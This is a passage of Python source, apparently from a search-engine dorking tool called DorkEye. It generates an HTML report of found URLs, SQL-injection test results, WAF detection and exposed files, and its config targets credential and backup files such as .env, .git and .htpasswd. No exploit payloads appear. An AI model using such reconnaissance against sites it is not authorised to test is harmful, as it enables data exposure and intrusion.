              <button class="exp-btn csv"  onclick="exportSelectedFiles('list')" style="font-size:9px;padding:2px 7px">LIST (TXT)</button>
              <button class="exp-btn json" onclick="exportSelectedFiles('json')" style="font-size:9px;padding:2px 7px">LIST (JSON)</button>
            </div>
            <div class="files-list" id="filesList">
""")

        # ── Build file rows inside the FILES panel ─────────────────────────
        if file_rows:
            for idx_f, fr in enumerate(file_rows):
                size_str      = fr.get("size_str", "N/A")
                is_accessible = fr.get("accessible", False)
                opacity_style = "" if is_accessible else ' style="opacity:.45"'
                status_icon   = "✓" if is_accessible else "✗"
                status_color  = "#00aa44" if is_accessible else "#663333"
                status_code   = fr.get("status_code", "?")
                url_raw       = fr.get("url", "")
                url_esc       = _html_mod.escape(url_raw, quote=True)
                url_short     = _html_mod.escape(url_raw[:62] + ("..." if len(url_raw) > 62 else ""), quote=False)
                cat_str       = fr.get("category", "").upper()
                ext_str       = fr.get("ext", "")
                parts.append(f"""              <div class="file-row"{opacity_style}>
                <input class="file-chk" type="checkbox" data-fidx="{idx_f}" onchange="updateSelCount()">
                <span style="font-size:9px;color:{status_color};flex-shrink:0" title="HTTP {status_code}">{status_icon}</span>
                <div class="file-info">
                  <a class="file-url" href="{url_esc}" target="_blank" title="{url_esc}">{url_short}</a>
                  <div class="file-cat">{cat_str} &nbsp;{ext_str}</div>
                </div>
                <span class="file-size">{size_str}</span>
                <a class="file-dl" href="{url_esc}" download>&#8681;</a>
              </div>
""")
        else:
            parts.append('              <div class="files-empty">No file results in this report.<br>Run with --analyze to detect accessible files.</div>\n')

        parts.append(f"""            </div><!-- /files-list -->
          </div><!-- /files-panel -->
        </div><!-- /files-wrap -->

      </div><!-- /right-btns -->
    </div><!-- /toolbar -->

    <div class="active-sub-info" id="sub-info"></div>
    <div class="table-wrap">
    <table>
        <colgroup>
          <col class="c-num"><col class="c-url"><col class="c-title">
          <col class="c-cat"><col class="c-sqli"><col class="c-waf"><col class="c-size">
        </colgroup>
        <thead><tr>
          <th>#</th><th>URL</th><th>Title</th>
          <th>Category</th><th>SQLi Status</th><th>WAF</th><th>Size</th>
        </tr></thead>
        <tbody id="results-tbody">
""")

        for idx, result in enumerate(self.results, 1):
            size        = self._format_size(result.get('file_size'))
            category    = result.get('category', 'unknown')
            ext         = result.get('extension', '').lower()
            url         = result['url']
            url_display = _html_mod.escape(url[:70] + ('...' if len(url) > 70 else ''), quote=False)
            title_disp  = (result.get('title', 'N/A') or 'N/A')[:40]
            dork_val    = _html_mod.escape(result.get('dork', '') or '', quote=True)
            url_esc_td  = _html_mod.escape(url, quote=True)
            title_esc   = _html_mod.escape(title_disp, quote=True)

            sqli_status = "N/A"
            sqli_class  = "sqli-untested"
            sqli_data   = "untested"
            sqli_conf   = ""
            waf_label   = ""

            # ── Build info payload for ⓘ popup ───────────────────────────────
            _sqli_t   = result.get("sqli_test", {})
            _vuln_str = ""
            _payload_str = ""
            if _sqli_t.get("tested"):
                _vuln_str = "VULNERABLE" if _sqli_t.get("vulnerable") else "SAFE"
                _conf_str = _sqli_t.get("overall_confidence", "")
                if _conf_str:
                    _vuln_str += f" ({_conf_str})"
                # collect method + evidence
                _details = []
                for _tt in _sqli_t.get("tests", []):
                    if _tt.get("vulnerable"):
                        _m   = _tt.get("method", "")
                        _evs = " | ".join(_tt.get("evidence", [])[:2])
                        _param = _tt.get("parameter", "")
                        _details.append(f"{_m}" + (f"[{_param}]" if _param else "") + (f": {_evs[:80]}" if _evs else ""))
                _payload_str = " ↳ ".join(_details[:3])
            _waf_info = _sqli_t.get("waf_detected", "") or ""

            _info_obj = _json.dumps({
                "url":       url,
                "title":     result.get("title", "") or "",
                "snippet":   (result.get("snippet", "") or "")[:200],
                "dork":      result.get("dork", "") or "",
                "category":  category,
                "ext":       ext,
                "ts":        result.get("timestamp", "") or "",
                "sqli":      _vuln_str,
                "payload":   _payload_str,
                "waf":       _waf_info,
                "size":      size,
            }, ensure_ascii=False).replace("'", "&#39;").replace("</", "<\\/")

            if "sqli_test" in result and result["sqli_test"].get("tested", False):
                conf      = result["sqli_test"].get("overall_confidence", "none")
                sqli_conf = conf
                if result["sqli_test"].get("vulnerable", False):
                    if conf == SQLiConfidence.CRITICAL.value:
                        sqli_status = "&#9888; CRITICAL"
                        sqli_class  = "sqli-critical"
                        sqli_data   = "critical"
                    else:
                        sqli_status = f"VULN ({conf})"
                        sqli_class  = "sqli-vuln"
                        sqli_data   = "vuln"
                else:
                    sqli_status = "SAFE"
                    sqli_class  = "sqli-safe"
                    sqli_data   = "safe"

                waf = result["sqli_test"].get("waf_detected", "")
                if waf:
                    waf_label = f'<span class="waf-label">{_html_mod.escape(waf)}</span>'

            parts.append(f"""            <tr data-category="{category}" data-ext="{ext}" data-sqli="{sqli_data}" data-conf="{sqli_conf}"
                data-idx="{idx-1}" data-url="{url_esc_td}" data-title="{title_esc}" data-dork="{dork_val}">
                <td style="color:#444">{idx}</td>
                <td><div class="url-cell"><a href="{url_esc_td}" target="_blank" title="{url_esc_td}">{url_display}</a><a class="dl-btn" href="{url_esc_td}" download>&#8681;</a><button class="info-btn" onclick="showInfo(this)" data-info='{_info_obj}' title="Details">&#9432;</button></div></td>
                <td title="{title_esc}">{_html_mod.escape(title_disp)}</td>
                <td><span class="category category-{category}">{category}</span></td>
                <td class="{sqli_class}">{sqli_status}</td>
                <td>{waf_label}</td>
                <td>{size}</td>
            </tr>
""")  

        parts.append(f"""        </tbody>
    </table>
    </div>
    <div class="footer">DorkEye v4.8 &nbsp;|&nbsp; xploits3c &nbsp;|&nbsp; For authorized security research only</div>
</div>

<div id="toast"></div>

<!-- ⓘ Info popup -->
<div class="info-popup" id="infoPopup">
  <div class="info-popup-title">
    <span>&#9432; RESULT DETAILS</span>
    <button class="info-close" onclick="closeInfo()">&#10005;</button>
  </div>
  <div id="infoBody"></div>
</div>

<script>
const EXPORT_DATA = {export_data_js};
const FILE_DATA   = {file_data_js};
const REPORT_BASE = "{report_base}";
</script>

<script>
/* MATRIX */
(function(){{
    const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
    const CH='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
    const FS=14;let cols,drops;
    function resize(){{c.width=window.innerWidth;c.height=window.innerHeight;cols=Math.floor(c.width/FS);drops=Array.from({{length:cols}},()=>Math.random()*-100);}}
    function draw(){{ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);for(let i=0;i<cols;i++){{const ch=CH[Math.floor(Math.random()*CH.length)];ctx.fillStyle=Math.random()>.95?'#fff':'#00ff41';ctx.font=FS+'px monospace';ctx.fillText(ch,i*FS,drops[i]*FS);if(drops[i]*FS>c.height&&Math.random()>.975)drops[i]=0;drops[i]+=.5+Math.random()*.5;}}}}
    resize();window.addEventListener('resize',resize);setInterval(draw,45);
}})();

/* FILTER */
const GROUP_CATS={{
  "doc":["documents","archives","backups"],
  "scripts":["scripts","configs","credentials"],
  "page":["webpage"]
}};
const SUB_PRED={{
  "doc-all":()=>true,
  "doc-pdf":(r)=>r.dataset.ext===".pdf",
  "doc-docx":(r)=>[".doc",".docx",".odt"].includes(r.dataset.ext),
  "doc-xlsx":(r)=>[".xls",".xlsx",".ods"].includes(r.dataset.ext),
  "doc-ppt":(r)=>[".ppt",".pptx"].includes(r.dataset.ext),
  "doc-arc":(r)=>[".zip",".rar",".tar",".gz",".7z",".bz2"].includes(r.dataset.ext),
  "sqli-all":(r)=>["vuln","safe","critical"].includes(r.dataset.sqli),
  "sqli-critical":(r)=>r.dataset.sqli==="critical",
  "sqli-vuln":(r)=>["vuln","critical"].includes(r.dataset.sqli),
  "sqli-safe":(r)=>r.dataset.sqli==="safe",
  "scripts-all":()=>true,
  "scripts-php":(r)=>r.dataset.ext===".php",
  "scripts-asp":(r)=>[".asp",".aspx"].includes(r.dataset.ext),
  "scripts-sh":(r)=>[".sh",".bat",".ps1"].includes(r.dataset.ext),
  "scripts-config":(r)=>[".conf",".config",".ini",".yaml",".yml",".json",".xml"].includes(r.dataset.ext),
  "scripts-creds":(r)=>[".env",".git",".svn",".htpasswd"].includes(r.dataset.ext)
}};
let activeGroup="all",activeSub=null;
function closeAllSubMenus(){{document.querySelectorAll('.sub-menu.open').forEach(m=>m.classList.remove('open'));document.querySelectorAll('.filter-btn.has-sub').forEach(b=>b.classList.remove('active'));}}
function applyFilter(btn){{
  const group=btn.dataset.group;
  if(btn.classList.contains('has-sub')){{
    if(activeGroup===group){{const m=document.getElementById('sub-'+group);if(m)m.classList.contains('open')?m.classList.remove('open'):m.classList.add('open');return;}}
    activeGroup=group;activeSub=group+'-all';
    document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');
    const menu=document.getElementById('sub-'+group);
    if(menu){{menu.querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));menu.querySelector('.sub-btn').classList.add('active');closeAllSubMenus();menu.classList.add('open');}}
  }}else{{
    closeAllSubMenus();document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');activeGroup=group;activeSub=null;
  }}
  renderRows();updateInfoBar();updateExportCounts();
}}
function applySubFilter(btn,groupId){{
  btn.closest('.sub-menu').querySelectorAll('.sub-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');activeSub=btn.dataset.sub;renderRows();updateInfoBar();updateExportCounts();
}}
function renderRows(){{
  const rows=document.querySelectorAll('#results-tbody tr');
  const pred=activeSub?(SUB_PRED[activeSub]||(()=>true)):(()=>true);
  rows.forEach(row=>{{
    let hide=false;
    if(activeGroup!=='all'){{
      if(activeGroup==='sqli'){{hide=!pred(row);}}
      else{{const cats=GROUP_CATS[activeGroup]||[];hide=!cats.includes(row.dataset.category||'');if(!hide)hide=!pred(row);}}
    }}
    hide?row.classList.add('hidden'):row.classList.remove('hidden');
    if(!hide)applySearchToRow(row);else row.classList.remove('srch-hidden');
  }});
}}
function buildSubBadges(){{
  const rows=Array.from(document.querySelectorAll('#results-tbody tr'));
  const inG=cats=>r=>cats.includes(r.dataset.category||'');
  const docR=rows.filter(inG(GROUP_CATS['doc']));
  const sqliR=rows.filter(r=>["vuln","safe","critical"].includes(r.dataset.sqli));
  const scR=rows.filter(inG(GROUP_CATS['scripts']));
  const s=(id,n)=>{{const el=document.getElementById(id);if(el)el.textContent=n;}};
  s('sbadge-doc-all',docR.length);
  s('sbadge-doc-pdf',docR.filter(r=>r.dataset.ext==='.pdf').length);
  s('sbadge-doc-docx',docR.filter(r=>['.doc','.docx','.odt'].includes(r.dataset.ext)).length);
  s('sbadge-doc-xlsx',docR.filter(r=>['.xls','.xlsx','.ods'].includes(r.dataset.ext)).length);
  s('sbadge-doc-ppt',docR.filter(r=>['.ppt','.pptx'].includes(r.dataset.ext)).length);
  s('sbadge-doc-arc',docR.filter(r=>['.zip','.rar','.tar','.gz','.7z','.bz2'].includes(r.dataset.ext)).length);
  s('sbadge-sqli-all',sqliR.length);
  s('sbadge-sqli-critical',sqliR.filter(r=>r.dataset.sqli==='critical').length);
  s('sbadge-sqli-vuln',sqliR.filter(r=>['vuln','critical'].includes(r.dataset.sqli)).length);
  s('sbadge-sqli-safe',sqliR.filter(r=>r.dataset.sqli==='safe').length);
  s('sbadge-scripts-all',scR.length);
  s('sbadge-scripts-php',scR.filter(r=>r.dataset.ext==='.php').length);
  s('sbadge-scripts-asp',scR.filter(r=>['.asp','.aspx'].includes(r.dataset.ext)).length);
  s('sbadge-scripts-sh',scR.filter(r=>['.sh','.bat','.ps1'].includes(r.dataset.ext)).length);
  s('sbadge-scripts-config',scR.filter(r=>['.conf','.config','.ini','.yaml','.yml','.json','.xml'].includes(r.dataset.ext)).length);
  s('sbadge-scripts-creds',scR.filter(r=>['.env','.git','.svn','.htpasswd'].includes(r.dataset.ext)).length);
}}
function updateInfoBar(){{
  const bar=document.getElementById('sub-info');if(!bar)return;
  const visible=document.querySelectorAll('#results-tbody tr:not(.hidden):not(.srch-hidden)').length;
  if(activeGroup==='all'&&!activeSub){{bar.innerHTML='&#10142; Showing <span>'+visible+'</span> result(s)';return;}}
  const subLabel=(activeSub||'').split('-').slice(1).join(' ').toUpperCase();
  bar.innerHTML='&#10142; Filter: <span>'+activeGroup.toUpperCase()+'</span> &rsaquo; <span>'+subLabel+'</span> &mdash; <span>'+visible+'</span> result(s)';
}}

/* SEARCH */
let activeScopes=new Set(['url','title','category','dork']);
function toggleSearch(){{
  const p=document.getElementById('srchPanel'),t=document.getElementById('srchToggle');
  const open=p.classList.contains('open');closeAllPanels();
  if(!open){{p.classList.add('open');t.classList.add('open');setTimeout(()=>document.getElementById('srchInput').focus(),80);}}
}}
function toggleScope(btn){{
  btn.classList.toggle('active');
  const sc=btn.dataset.scope;
  btn.classList.contains('active')?activeScopes.add(sc):activeScopes.delete(sc);
  doSearch();
}}
function doSearch(){{
  const q=document.getElementById('srchInput').value.trim().toLowerCase();
  const rows=document.querySelectorAll('#results-tbody tr');
  let match=0;
  rows.forEach(row=>{{if(!row.classList.contains('hidden')){{const found=applySearchToRow(row,q);if(found)match++;}}else{{row.classList.remove('srch-hidden');}}}});
  const el=document.getElementById('srchCount');if(el)el.textContent=q?match:'–';
  updateInfoBar();updateExportCounts();
}}
function applySearchToRow(row,q){{
  if(q===undefined)q=(document.getElementById('srchInput').value||'').trim().toLowerCase();
  if(!q){{row.classList.remove('srch-hidden');return true;}}
  let hay='';
  if(activeScopes.has('url'))    hay+=' '+(row.dataset.url||'');
  if(activeScopes.has('title'))  hay+=' '+(row.dataset.title||'');
  if(activeScopes.has('category'))hay+=' '+(row.dataset.category||'');
  if(activeScopes.has('dork'))   hay+=' '+(row.dataset.dork||'');
  const found=hay.toLowerCase().includes(q);
  found?row.classList.remove('srch-hidden'):row.classList.add('srch-hidden');
  return found;
}}
function clearSearch(){{
  document.getElementById('srchInput').value='';
  document.querySelectorAll('#results-tbody tr').forEach(r=>r.classList.remove('srch-hidden'));
  const el=document.getElementById('srchCount');if(el)el.textContent='–';
  updateInfoBar();updateExportCounts();
}}

/* EXPORT LINKS PANEL */
function toggleExportPanel(){{
  const p=document.getElementById('exportPanel'),t=document.getElementById('exportToggle');
  const open=p.classList.contains('open');closeAllPanels();
  if(!open){{p.classList.add('open');t.classList.add('open');updateExportCounts();}}
}}
function updateExportCounts(){{
  const sqliAll =EXPORT_DATA.filter(r=>["vuln","safe","critical"].includes(r.sqli));
  const sqliVuln=EXPORT_DATA.filter(r=>["vuln","critical"].includes(r.sqli));
  const sqliSafe=EXPORT_DATA.filter(r=>r.sqli==="safe");
  const viewIdxs=new Set(Array.from(document.querySelectorAll('#results-tbody tr:not(.hidden):not(.srch-hidden)')).map(r=>parseInt(r.dataset.idx)));
  const s=(id,n)=>{{const el=document.getElementById(id);if(el)el.textContent='('+n+')';}}; 
  s('epCntSqliAll', sqliAll.length);
  s('epCntSqliVuln',sqliVuln.length);
  s('epCntSqliSafe',sqliSafe.length);
  s('epCntView',    EXPORT_DATA.filter((_,i)=>viewIdxs.has(i)).length);
}}
function _getRows(scope){{
  if(scope==='all')       return EXPORT_DATA;
  if(scope==='sqli-all')  return EXPORT_DATA.filter(r=>["vuln","safe","critical"].includes(r.sqli));
  if(scope==='sqli-vuln') return EXPORT_DATA.filter(r=>["vuln","critical"].includes(r.sqli));
  if(scope==='sqli-safe') return EXPORT_DATA.filter(r=>r.sqli==="safe");
  if(scope==='view'){{
    const vis=new Set(Array.from(document.querySelectorAll('#results-tbody tr:not(.hidden):not(.srch-hidden)')).map(r=>parseInt(r.dataset.idx)));
    return EXPORT_DATA.filter((_,i)=>vis.has(i));
  }}
  return EXPORT_DATA;
}}
function _scopeLabel(scope){{return{{'all':'all','sqli-all':'sqli_tested','sqli-vuln':'sqli_vuln','sqli-safe':'sqli_safe','view':'view'}}[scope]||scope;}}
function _download(content,filename,mime){{
  const blob=new Blob([content],{{type:mime}});
  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=filename;
  document.body.appendChild(a);a.click();setTimeout(()=>{{URL.revokeObjectURL(a.href);document.body.removeChild(a);}},100);
}}
function _showToast(msg){{
  const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'),2200);
}}
function doExport(fmt,scope){{
  const rows=_getRows(scope);
  if(!rows.length){{_showToast('No results to export for this filter.');return;}}
  const ts=new Date().toISOString().slice(0,19).replace(/[:T]/g,'-');
  const base=REPORT_BASE+'_links_'+_scopeLabel(scope)+'_'+ts;
  if(fmt==='txt'){{
    const lines=rows.map((r,i)=>{{
      let s=(i+1)+'. '+r.url+'\\n';
      if(r.title)   s+='   Title    : '+r.title+'\\n';
      if(r.category)s+='   Category : '+r.category+'\\n';
      if(r.dork)    s+='   Dork     : '+r.dork+'\\n';
      if(r.sqli&&r.sqli!=='untested')s+='   SQLi     : '+r.sqli.toUpperCase()+(r.conf?' ('+r.conf+')':'')+'\\n';
      if(r.waf)     s+='   WAF      : '+r.waf+'\\n';
      s+='   Time     : '+r.timestamp+'\\n';
      return s;
    }});
    _download('DorkEye Export — Links\\nScope: '+scope+'\\nGenerated: '+ts+'\\nTotal: '+rows.length+'\\n\\n'+lines.join('\\n'),base+'.txt','text/plain');
    _showToast('Exported '+rows.length+' links → '+base+'.txt');
  }}else if(fmt==='json'){{
    _download(JSON.stringify({{meta:{{generated:ts,scope:scope,total:rows.length}},results:rows}},null,2),base+'.json','application/json');
    _showToast('Exported '+rows.length+' links → '+base+'.json');
  }}else if(fmt==='csv'){{
    const headers=['url','title','dork','category','ext','sqli','conf','waf','timestamp'];
    const esc=v=>{{const s=String(v??'');return s.includes(',')||s.includes('"')||s.includes('\\n')?'"'+s.replace(/"/g,'""')+'"':s;}};
    _download([headers.join(','),...rows.map(r=>headers.map(h=>esc(r[h]||'')).join(','))].join('\\r\\n'),base+'.csv','text/csv');
    _showToast('Exported '+rows.length+' links → '+base+'.csv');
  }}
}}

/* FILES PANEL */
function toggleFilesPanel(){{
  const p=document.getElementById('filesPanel'),t=document.getElementById('filesToggle');
  const open=p.classList.contains('open');closeAllPanels();
  if(!open){{p.classList.add('open');t.classList.add('open');updateSelCount();}}
}}
function updateSelCount(){{
  const n=document.querySelectorAll('.file-chk:checked').length;
  const el=document.getElementById('selCount');if(el)el.textContent=n;
}}
function selectAllFiles(val){{
  document.querySelectorAll('.file-chk').forEach(c=>c.checked=val);updateSelCount();
}}
function exportSelectedFiles(fmt){{
  const checked=Array.from(document.querySelectorAll('.file-chk:checked'));
  if(!checked.length){{_showToast('No files selected.');return;}}
  const rows=checked.map(c=>FILE_DATA[parseInt(c.dataset.fidx)]).filter(Boolean);
  const ts=new Date().toISOString().slice(0,19).replace(/[:T]/g,'-');
  const base=REPORT_BASE+'_files_selected_'+ts;
  if(fmt==='list'){{
    const lines=rows.map((r,i)=>{{
      let s=(i+1)+'. '+r.url+'\\n';
      if(r.title)    s+='   Title    : '+r.title+'\\n';
      if(r.category) s+='   Category : '+r.category+'\\n';
      if(r.ext)      s+='   Ext      : '+r.ext+'\\n';
      if(r.size_str) s+='   Size     : '+r.size_str+'\\n';
      s+='   Status   : '+(r.accessible?'Accessible (HTTP '+r.status_code+')':'Not accessible')+'\\n';
      s+='   Time     : '+r.timestamp+'\\n';
      return s;
    }});
    _download('DorkEye File List\\nGenerated: '+ts+'\\nSelected: '+rows.length+'\\n\\n'+lines.join('\\n'),base+'.txt','text/plain');
    _showToast('File list ('+rows.length+') → '+base+'.txt');
  }}else if(fmt==='json'){{
    _download(JSON.stringify({{meta:{{generated:ts,total:rows.length}},files:rows}},null,2),base+'.json','application/json');
    _showToast('File list ('+rows.length+') → '+base+'.json');
  }}
}}

/* CLOSE ALL PANELS */
function closeAllPanels(){{
  ['srchPanel','exportPanel','filesPanel'].forEach(id=>document.getElementById(id).classList.remove('open'));
  ['srchToggle','exportToggle','filesToggle'].forEach(id=>document.getElementById(id).classList.remove('open'));
}}
document.addEventListener('click',(e)=>{{
  if(!e.target.closest('.filter-group')&&!e.target.closest('.filter-btn[data-group]')){{
    closeAllSubMenus();
    document.querySelectorAll('.filter-btn').forEach(b=>{{if(b.dataset.group===activeGroup)b.classList.add('active');}});
  }}
  if(!e.target.closest('.srch-wrap')&&!e.target.closest('.export-wrap')&&!e.target.closest('.files-wrap')){{
    closeAllPanels();
  }}
}});

/* INIT */
buildSubBadges();updateInfoBar();updateExportCounts();updateSelCount();

/* ⓘ INFO POPUP */
let _infoOpen=false;
function showInfo(btn){{
  const d=JSON.parse(btn.getAttribute('data-info'));
  const sqliColor=d.sqli&&d.sqli.startsWith('VULN')?'#ff3333':d.sqli==='SAFE'?'#00ff41':d.sqli.startsWith('VULNERABLE')?'#ff00ff':'#444';
  let rows='';
  const row=(lbl,val,color)=>val?`<div class="info-row"><span class="info-lbl">${{lbl}}</span><span class="info-val" style="color:${{color||'#00aaff'}}">${{val}}</span></div>`:'';
  rows+=row('URL',d.url.length>80?d.url.slice(0,80)+'…':d.url);
  rows+=row('Title',d.title);
  rows+=row('Category',d.category,'#00cc88');
  rows+=row('Extension',d.ext,'#ffaa00');
  rows+=row('Size',d.size,'#009922');
  rows+=row('Timestamp',d.ts,'#666');
  rows+=row('Dork',d.dork&&d.dork.length>80?d.dork.slice(0,80)+'…':d.dork,'#cc88ff');
  rows+=row('Snippet',d.snippet&&d.snippet.length>120?d.snippet.slice(0,120)+'…':d.snippet,'#777');
  if(d.sqli)rows+=row('SQLi Status',d.sqli,sqliColor);
  if(d.payload)rows+=row('Method/Payload',d.payload.length>100?d.payload.slice(0,100)+'…':d.payload,'#ff6666');
  if(d.waf)rows+=row('WAF','⚠ '+d.waf,'#ffaa00');
  document.getElementById('infoBody').innerHTML=rows||'<span style="color:#444">No details.</span>';
  const popup=document.getElementById('infoPopup');
  const rect=btn.getBoundingClientRect();
  let top=rect.bottom+window.scrollY+4;
  let left=rect.left+window.scrollX-300;
  if(left<8)left=8;
  if(left+520>window.innerWidth)left=window.innerWidth-528;
  popup.style.top=top+'px';popup.style.left=left+'px';
  popup.classList.add('open');_infoOpen=true;
}}
function closeInfo(){{document.getElementById('infoPopup').classList.remove('open');_infoOpen=false;}}
document.addEventListener('click',(e)=>{{if(_infoOpen&&!e.target.closest('#infoPopup')&&!e.target.classList.contains('info-btn'))closeInfo();}});
</script>
</body>
</html>""")

        html = "".join(parts)
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)


    def _format_size(self, size):
        """Format a byte count into a human-readable string (B / KB / MB / GB / TB), or "N/A"."""
        if size is None:
            return "N/A"
        try:
            size = float(size)
        except (TypeError, ValueError):
            return "N/A"
        if size < 0:
            return "N/A"
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"

    def print_statistics(self):
        """Print a Rich-formatted statistics table with result counts, categories, and execution time."""
        table = Table(title="", show_header=False, box=None, padding=(0, 2))
        table.add_column("Metric", style="cyan")
        table.add_column("Value",  style="green", justify="right")
        console.print("\n[bold yellow]┌─[ Search Statistics ][/bold yellow]")
        console.print("[bold yellow]│[/bold yellow]")
        table.add_row("├─> Total Results Found", str(self.stats.get("total_found", 0)))
        table.add_row("├─> Unique Results",      str(len(self.results)))
        table.add_row("├─> Duplicates Removed",  str(self.stats.get("duplicates", 0)))
        table.add_row("├─> Blacklisted",         str(self.stats.get("blacklisted", 0)))
        if self.config.get("sqli_detection", False):
            table.add_row("├─> SQLi Vulnerabilities", f"[bold red]{self.stats.get('sqli_vulnerable', 0)}[/bold red]")
            table.add_row("├─> WAF Detected",          f"[bold yellow]{self.stats.get('waf_detected', 0)}[/bold yellow]")
        table.add_row("└─> Execution Time", f"{round(time.time() - self.start_time, 2)}s")
        console.print(table)
        categories = {k.replace("category_", ""): v for k, v in self.stats.items() if k.startswith("category_")}
        if categories:
            cat_table = Table(title="", show_header=False, box=None, padding=(0, 2))
            cat_table.add_column("Category", style="cyan")
            cat_table.add_column("Count",    style="green", justify="right")
            console.print("\n[bold yellow]┌─[ Results by Category ][/bold yellow]")
            console.print("[bold yellow]│[/bold yellow]")
            sorted_cats = sorted(categories.items(), key=lambda x: x[1], reverse=True)
            for i, (category, count) in enumerate(sorted_cats):
                prefix = "└─>" if i == len(sorted_cats) - 1 else "├─>"
                cat_table.add_row(f"{prefix} {category.capitalize()}", str(count))
            console.print(cat_table)


# ══════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════

def _load_results_from_file(path: str) -> List[Dict]:
    """
    Load DorkEye results from a .json or .txt file in the Dump/ folder.
    Returns a list of result dicts (each must have at least 'url').
    """
    p = Path(path)
    # Try Dump/ subfolder if not found directly
    if not p.exists():
        alt = Path(__file__).parent / "Dump" / path
        if alt.exists():
            p = alt
    if not p.exists():
        console.print(f"[red][!] File not found: {path}[/red]")
        return []

    ext = p.suffix.lower()
    try:
        if ext == ".json":
            with open(p, "r", encoding="utf-8") as f:
                data = json.load(f)
            # Support both raw list and {"results": [...]} formats
            if isinstance(data, list):
                return data
            if isinstance(data, dict) and "results" in data:
                return data["results"]
            console.print(f"[red][!] Unrecognized JSON structure in {path}[/red]")
            return []
        elif ext == ".txt":
            results = []
            with open(p, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and line.startswith("http"):
                        results.append({"url": line, "title": "", "snippet": "",
                                        "dork": "", "timestamp": "", "extension": "",
                                        "category": "webpage"})
            return results
        else:
            console.print(f"[red][!] Unsupported file format: {ext} (use .json or .txt)[/red]")
            return []
    except Exception as e:
        console.print(f"[red][!] Error loading file '{path}': {e}[/red]")
        return []


def load_config(config_file: str = None) -> Dict:
    """Load and merge a YAML or JSON config file with DEFAULT_CONFIG; return the merged dict."""
    if not config_file:
        return DEFAULT_CONFIG.copy()
    try:
        with open(config_file, 'r') as f:
            user_config = json.load(f) if config_file.endswith('.json') else yaml.safe_load(f)
        config = DEFAULT_CONFIG.copy()
        config.update(user_config)
        return config
    except Exception as e:
        console.print(f"[red][!] Error loading config: {e}[/red]")
        console.print("[yellow][!] Using default configuration[/yellow]")
        return DEFAULT_CONFIG.copy()


def create_sample_config():
    """Write a sample dorkeye_config.yaml to disk and confirm to the terminal."""
    config_yaml = """# DorkEye Configuration

extensions:
  documents: [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx"]
  archives: [".zip", ".rar", ".tar", ".gz", ".7z"]
  databases: [".sql", ".db", ".sqlite", ".mdb"]
  backups: [".bak", ".backup", ".old"]
  configs: [".conf", ".config", ".ini", ".yaml", ".yml", ".json", ".xml"]
  scripts: [".php", ".asp", ".jsp", ".sh"]
  credentials: [".env", ".git", ".htpasswd"]

blacklist: []
whitelist: []
analyze_files: true
sqli_detection: false
http_fingerprinting: true
stealth_mode: false
request_timeout: 10
max_retries: 3
user_agent_rotation: true
extended_delay_every_n_results: 100
"""
    with open("dorkeye_config.yaml", "w") as f:
        f.write(config_yaml)
    console.print("[green][✓] Sample config created: dorkeye_config.yaml[/green]")


def resolve_templates_argument(template_arg):
    """Resolve the --templates argument to a list of Path objects inside the Templates/ directory."""
    templates_dir = Path(__file__).parent / "Templates"
    if template_arg is None:
        return [templates_dir / "dorks_templates.yaml"]
    if template_arg.lower() == "all":
        yaml_files = list(templates_dir.glob("*.yaml"))
        if not yaml_files:
            console.print("[red][!] No template files found in Templates directory[/red]")
            sys.exit(1)
        return yaml_files
    specific_path = templates_dir / template_arg
    if not specific_path.exists():
        console.print(f"[red][!] Template not found: {template_arg}[/red]")
        sys.exit(1)
    return [specific_path]


def get_categories_from_templates(template_files) -> List[str]:
    """Return a sorted list of category names found across all given template YAML files."""
    categories = set()
    for template_file in template_files:
        try:
            with open(template_file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
                if data and "templates" in data:
                    categories.update(data["templates"].keys())
        except Exception as e:
            console.print(f"[yellow][!] Could not read categories from {template_file}: {e}[/yellow]")
    return sorted(categories)



# ══════════════════════════════════════════════════════════════
#  WIZARD
# ══════════════════════════════════════════════════════════════

def run_wizard():
    """Run the interactive guided wizard session (main menu, dork search, dork generator)."""
    print_banner()
    console.print(Panel(
        "[bold green]Interactive Wizard[/bold green] — Navigate with numbers, ENTER to confirm\n"
        "[dim]Press Ctrl+C at any time to abort[/dim]",
        border_style="green",
        title="[bold yellow][ DorkEye Wizard ][/bold yellow]"
    ))

    # ── Internal wizard helpers ─────────────────────────────────────────────────

    def ask_yes_no(prompt: str, default_yes: bool = False) -> bool:
        """Print prompt with a [Y/n] or [y/N] hint and return True/False from user input."""
        hint = "[Y/n]" if default_yes else "[y/N]"
        console.print(f"[cyan]{prompt} {hint}:[/cyan] ", end="")
        try:
            ans = input("").strip().lower()
        except KeyboardInterrupt:
            return default_yes
        return default_yes if ans == "" else ans in ("y", "yes")

    def ask_choice(prompt: str, options: list, default: int = 0) -> int:
        """Print a numbered option list and return the 0-based index chosen by the user."""
        for i, opt in enumerate(options, 1):
            marker = "[bold green]>[/bold green]" if i - 1 == default else " "
            console.print(f"  {marker} [yellow]{i})[/yellow] {opt}")
        console.print(f"[cyan]{prompt} (default {default+1}):[/cyan] ", end="")
        try:
            raw = input("").strip()
            idx = int(raw) - 1
            return idx if 0 <= idx < len(options) else default
        except (ValueError, KeyboardInterrupt):
            return default

    def ask_string(prompt: str, placeholder: str = "") -> str:
        """Print a prompt with an optional example and return the raw string entered by the user."""
        display = f" [dim](e.g. {placeholder})[/dim]" if placeholder else ""
        console.print(f"[cyan]{prompt}{display}:[/cyan] ", end="")
        try:
            return input("").strip()
        except KeyboardInterrupt:
            return ""

